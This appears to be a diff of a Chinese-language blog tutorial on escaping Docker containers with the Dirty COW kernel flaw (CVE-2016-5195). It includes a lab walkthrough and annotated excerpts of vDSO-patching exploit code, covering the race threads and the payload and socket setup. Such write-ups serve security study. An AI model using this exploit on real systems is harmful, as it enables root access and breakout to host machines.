@@ -12,9 +12,18 @@
 
 <link rel="stylesheet" href="/css/main.css">
 
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=KaiTi:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
+ <script> 
+   (function(){
+          if(''){
+              if (prompt('请输入文章密码') !== ''){
+                  alert('密码错误！');
+                  history.back();
+              }
+          }
+      })();
+  </script>
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
@@ -219,11 +228,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h4 id="Decker简介"><a href="#Decker简介" class="headerlink" title="Decker简介"></a>Decker简介</h4><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%95%9C%E5%83%8F/1574">镜像</a>中，然后发布到任何流行的 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Linux">Linux</a>或<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows/165458">Windows</a>操作系统的机器上，也可以实现<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E5%8C%96/547949">虚拟化</a>。容器是完全使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B2%99%E7%AE%B1/393318">沙箱</a>机制，相互之间不会有任何接口。、</p>
+        <h4 id="Decker简介"><a href="#Decker简介" class="headerlink" title="Decker简介"></a>Decker简介</h4><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/镜像/1574">镜像</a>中，然后发布到任何流行的 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Linux">Linux</a>或<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows/165458">Windows</a>操作系统的机器上，也可以实现<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/虚拟化/547949">虚拟化</a>。容器是完全使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/沙箱/393318">沙箱</a>机制，相互之间不会有任何接口。、</p>
 <span id="more"></span>
-
 <h5 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h5><p>Sandboxie(又叫沙箱、沙盘)即是一个虚拟系统程序，允许你在沙盘环境中运行浏览器或其他程序，因此运行所产生的变化可以随后删除。它创造了一个类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。 在网络安全中，沙箱指在隔离环境中，用以测试不受信任的文件或应用程序等行为的工具。</p>
-<p>近年来，随着网络安全问题的日益突出，人们更多的将沙箱技术应用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E4%B8%8A%E5%86%B2%E6%B5%AA">网上冲浪</a>方面。从技术实现角度而言，就是从原有的阻止可疑程序对系统访问，转变成将可疑程序对磁盘、注册表等的访问重定向到指定文件夹下，从而消除对系统的危害。</p>
+<p>近年来，随着网络安全问题的日益突出，人们更多的将沙箱技术应用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/网上冲浪">网上冲浪</a>方面。从技术实现角度而言，就是从原有的阻止可疑程序对系统访问，转变成将可疑程序对磁盘、注册表等的访问重定向到指定文件夹下，从而消除对系统的危害。</p>
 <p>无论是想假设网站，资料库，Mail Server等，只需要 docker run 就可以启动环境，不用劳神配置环境。但是Docker也是存在漏洞的。</p>
 <p>一个完整的Docker有以下几个部分组成：</p>
 <ol>
@@ -238,12 +246,10 @@
 <li>容器Container，镜像是静态的定义，容器则是镜像运行的实体，类似类和示例。容器可以被创建，启动，停止，删除等操作。 </li>
 <li>仓库Repository，仓库即代码控制中心，保存镜像。</li>
 </ol>
-<img src="/2021/12/23/docker/image-20211222183934542.png" alt="image-20211222183934542" style="zoom:50%;">
-
+<p><img src="/2021/12/23/docker/image-20211222183934542.png" alt="image-20211222183934542" style="zoom:50%;"></p>
 <h5 id="docker启动："><a href="#docker启动：" class="headerlink" title="docker启动："></a>docker启动：</h5><p>docker启动链：docker-client -&gt; dockerd -&gt; docker-containerd -&gt; docker-containerd-shim -&gt; runc （容器外） -&gt; runc（容器内） -&gt; containter-entrypoint</p>
 <p>启动docker 首先简单启动一个容器： docker run -i -t ubuntu:20.04 /bin/bash ubuntu:20.04即我们指定运行的镜像，然后在启动容器里执行/bin/bash，-i参数运行对容器内的标准输 入进行交互，-t则在新容器中指定一个伪终端或者终端</p>
-<img src="/2021/12/23/docker/image-20211222184904237.png" alt="image-20211222184904237" style="zoom: 25%;">
-
+<p><img src="/2021/12/23/docker/image-20211222184904237.png" alt="image-20211222184904237" style="zoom: 25%;"></p>
 <h4 id="Dirty-COW漏洞逃逸"><a href="#Dirty-COW漏洞逃逸" class="headerlink" title="Dirty COW漏洞逃逸"></a>Dirty COW漏洞逃逸</h4><p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。<br>竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。<br>在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p>
 <h5 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h5><ul>
 <li><strong>操作机</strong>：<code>Ubuntu</code></li>
@@ -290,31 +296,22 @@
 <h6 id="2：使用POC验证漏洞"><a href="#2：使用POC验证漏洞" class="headerlink" title="2：使用POC验证漏洞"></a>2：使用POC验证漏洞</h6><p>使用账号<code>user</code>，密码为<code>123456</code>的账户进行登录</p>
 <p>因为此时还是user用户，我们需要切换到root用户来进行Docker</p>
 <p>使用命令：</p>
-<img src="/2021/12/23/docker/image-20211222191249206.png" alt="image-20211222191249206" style="zoom:67%;">
-
+<p><img src="/2021/12/23/docker/image-20211222191249206.png" alt="image-20211222191249206" style="zoom:67%;"></p>
 <p>现在已经切换到root用户，接下来我们、</p>
 <p>运行命令来启动Docker：</p>
-<img src="/2021/12/23/docker/image-20211222191500477.png" alt="image-20211222191500477" style="zoom:67%;">
-
+<p><img src="/2021/12/23/docker/image-20211222191500477.png" alt="image-20211222191500477" style="zoom:67%;"></p>
 <p>接下来运行dirtycow镜像，使用命令：</p>
-<img src="/2021/12/23/docker/image-20211222191707955.png" alt="image-20211222191707955" style="zoom:80%;">
-
+<p><img src="/2021/12/23/docker/image-20211222191707955.png" alt="image-20211222191707955" style="zoom:80%;"></p>
 <p>使用本地1234端口连接docker的1234端口运行dirtycow镜像，并将其临时命名为test</p>
 <p>现在已经运行成功了，接下来进入镜像内部进行操作，使用命令：</p>
-<img src="/2021/12/23/docker/image-20211222191949542.png" alt="image-20211222191949542" style="zoom:80%;">
-
+<p><img src="/2021/12/23/docker/image-20211222191949542.png" alt="image-20211222191949542" style="zoom:80%;"></p>
 <p>可以看到，已经成功的进入了test镜像中，Docker镜像与宿主机，也就是我们的物理机是隔离的，它是完全独立的系统。</p>
 <p>接下来运行POC文件，使用命令：</p>
-<img src="/2021/12/23/docker/image-20211226153819731.png" alt="image-20211226153819731" style="zoom:67%;">
-
+<p><img src="/2021/12/23/docker/image-20211226153819731.png" alt="image-20211226153819731" style="zoom:67%;"></p>
 <p>当看到successfully的字样，就代表成功了</p>
-<img src="/2021/12/23/docker/image-20211226153936819.png" alt="image-20211226153936819" style="zoom:67%;">
-
+<p><img src="/2021/12/23/docker/image-20211226153936819.png" alt="image-20211226153936819" style="zoom:67%;"></p>
 <p>离开docker，发现在docker内时在宿主机上建立的文件nice，表明docker被击穿</p>
-<img src="/2021/12/23/docker/image-20211222192725132.png" alt="image-20211222192725132" style="zoom: 80%;">
-
-
-
+<p><img src="/2021/12/23/docker/image-20211222192725132.png" alt="image-20211222192725132" style="zoom: 80%;"></p>
 <h6 id="实验结果分析与总结"><a href="#实验结果分析与总结" class="headerlink" title="实验结果分析与总结"></a>实验结果分析与总结</h6><p>本实验讲述了在Dirty Cow漏洞的基础上，通过构造POC，可以在Docker容器中直接操作宿主机系统，因此在以后使用中，应尽量注意，要有良好的安全意识，及时修复。</p>
 <p><strong>修复建议</strong></p>
 <p>修复Dirty Cow漏洞（请参考上一篇：Dirty Cow漏洞分析）</p>
@@ -329,7 +326,8 @@
 <li><p>切换当前 namespace</p>
 </li>
 <li><p>打开 root shell，完成逃逸</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（一）脏牛漏洞(CVE-2016-5195)与VDSO(虚拟动态共享对象)</span><br><span class="line">Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</span><br><span class="line">竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。</span><br><span class="line">在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（一）脏牛漏洞(CVE-2016-5195)与VDSO(虚拟动态共享对象)</span><br><span class="line">Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</span><br><span class="line">竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。</span><br><span class="line">在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
 <p>理解脏牛漏洞，需要理解内存映射的工作原理,举课本上的例子：在Unix中，mmap（）函数是一个将文件或者设备映射到内存的POSIX兼容的系统调用，默认映射类型是文件映射，也就是把进程的一部分虚拟内存区域映射到文件中。</p>
 <p>从被映射的内存区域读取数据时，实际上读取的是文件。</p>
@@ -342,12 +340,9 @@
 <p>由于“MAP_PRIVATE利用了写实拷贝的技术，一旦有进程试图修改共享内存区域，就在内存中单独开拓一片区域，储存修改后的内存，新开辟的内存段不再映射先前的文件，此后对这段内存的任何修改都对底层文件没有影响”，纵便一个文件被设置为只读，用这种方式映射到内存之后依旧可以其值修改（比如用write（）系统调用），只不过修改的值对文件没影响，会保存到内存开辟的新区域。</p>
 <p>事实上，write（）系统调用可以被用来修改映射内存，但对于写时复制类型的内存，write()需要执行三个关键步骤：a）对映射的物理内存做一份拷贝 b）更新页表，让虚拟内存指向新创建的物理内存  c）写入内存。这几步操作不是原子化的，换言之这几步操作的执行会被其他线程打断。</p>
 <p>比如，如果在b） c）之间使用manvise（）系统调用丢弃内存的私有拷贝，就会直接修改只读文件。</p>
-<img src="/2021/12/23/docker/image-20211225103627447.png" alt="image-20211225103627447" style="zoom:50%;">
-
+<p><img src="/2021/12/23/docker/image-20211225103627447.png" alt="image-20211225103627447" style="zoom:50%;"></p>
 <h4 id="0xdeadbeaf"><a href="#0xdeadbeaf" class="headerlink" title="0xdeadbeaf"></a>0xdeadbeaf</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">prologue</span> *<span class="title">prologue</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">	<span class="keyword">uint16_t</span> port;</span><br><span class="line">	<span class="keyword">uint32_t</span> ip;</span><br><span class="line">	<span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">	ip = htonl(PAYLOAD_IP);<span class="comment">//htonl 传统内存数据存储方式 -&gt; 网络字节存储 4字节</span></span><br><span class="line">	port = htons(PAYLOAD_PORT);<span class="comment">//htons 传统内存数据存储方式 -&gt; 网络字节存储 2字节</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;<span class="comment">//如果有环境变量</span></span><br><span class="line">		<span class="keyword">if</span> (parse_ip_port(argv[<span class="number">1</span>], &amp;ip, &amp;port) != <span class="number">0</span>)<span class="comment">//如果输入参数有:,则将:前的字符转化为IP,后面的字符转化为端口并赋值给port</span></span><br><span class="line">			<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] payload target: %s:%d\n&quot;</span>,</span><br><span class="line">		inet_ntoa(*(struct in_addr *)&amp;ip), ntohs(port));</span><br><span class="line"></span><br><span class="line">	arg.vdso_addr = get_vdso_addr();<span class="comment">//通过getauxval()函数获取vDSO的地址</span></span><br><span class="line">	<span class="keyword">if</span> (arg.vdso_addr == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line"></span><br><span class="line">	prologue = fingerprint_prologue(arg.vdso_addr);<span class="comment">//通过vDSO的首地址,找到clock_gettime()函数的地址,</span></span><br><span class="line">	<span class="comment">//然后对比clock_gettime函数前几个字符和prologue[]数组的每一项,如果存在匹配项,则说明可以Inline Hook,</span></span><br><span class="line">	<span class="comment">//返回匹配的prologue数组项</span></span><br><span class="line">	<span class="keyword">if</span> (prologue == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] this vDSO version isn&#x27;t supported\n&quot;</span>);</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;    add first entry point instructions to prologues\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (patch_payload(prologue, ip, port) == <span class="number">-1</span>)<span class="comment">//将payload中的IP,PORT,prologue项,分别替换成</span></span><br><span class="line">		<span class="comment">//新的IP,PORT(通过参数修改),prologue(通过fingerprint_prologue()匹配得到)</span></span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (build_vdso_patch(arg.vdso_addr, prologue) == <span class="number">-1</span>)</span><br><span class="line">		<span class="comment">//填充vdso_patch数组,如果要放置payload的内存地址数据不为0,则提示</span></span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line"></span><br><span class="line">	s = create_socket(port);<span class="comment">//设置一个监听socket,等待payload被执行,向这个socket发起连接</span></span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (exploit(&amp;arg, <span class="literal">true</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="comment">//函数介绍,通过漏洞,将数据写到指定内存地址</span></span><br><span class="line">		<span class="comment">//do_patch = true</span></span><br><span class="line">		<span class="comment">//= &gt; 将payload写进vDSO, 修改clock_gettime前面几个字节为jmp payload</span></span><br><span class="line">		<span class="comment">//do_patch = false</span></span><br><span class="line">		<span class="comment">//= &gt; 将vDSO地址中原来的数据还原回去</span></span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;exploit failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	yeah(&amp;arg, s);</span><br><span class="line">	<span class="comment">//等待连接</span></span><br><span class="line">	<span class="comment">//还原原vDSO空间数据</span></span><br><span class="line">	<span class="comment">//处理连接后的数据发送与接收</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//exploit()</span></span><br><span class="line">pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        warn(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//创建失败</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        check(arg);<span class="comment">//子进程检查</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    arg-&gt;stop = <span class="literal">false</span>;</span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, arg);</span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, ptrace_thread, arg);</span><br><span class="line"><span class="comment">//这里开启两个进程,子进程不停检查数据是否成功写入,成功则返回0,否则返回1</span></span><br><span class="line"><span class="comment">//主线程开启两个线程,</span></span><br><span class="line"><span class="comment">//ptrace_thread 向vDSO写</span></span><br><span class="line"><span class="comment">//madvise_thread 将vDSO映射空间释放,对ptrace线程造成干扰,从而触发漏洞,写入成功</span></span><br><span class="line"><span class="comment">//ptrace循环写</span></span><br><span class="line"><span class="keyword">while</span> (n &gt;= <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;value, s, <span class="keyword">sizeof</span>(value));</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, d, value) == <span class="number">-1</span>) &#123;</span><br><span class="line">            warn(<span class="string">&quot;ptrace(PTRACE_POKETEXT)&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        n -= <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">        d += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">        s += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//madvise循环释放</span></span><br><span class="line"><span class="keyword">while</span> (!arg-&gt;stop) &#123;</span><br><span class="line">        <span class="keyword">if</span> (madvise(arg-&gt;vdso_addr, VDSO_SIZE, MADV_DONTNEED) == <span class="number">-1</span>) &#123;</span><br><span class="line">            warn(<span class="string">&quot;madvise&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
 
     </div>
 
@@ -444,7 +439,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -478,7 +473,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -535,6 +530,8 @@
 
 
 
+
+  
 
   
 
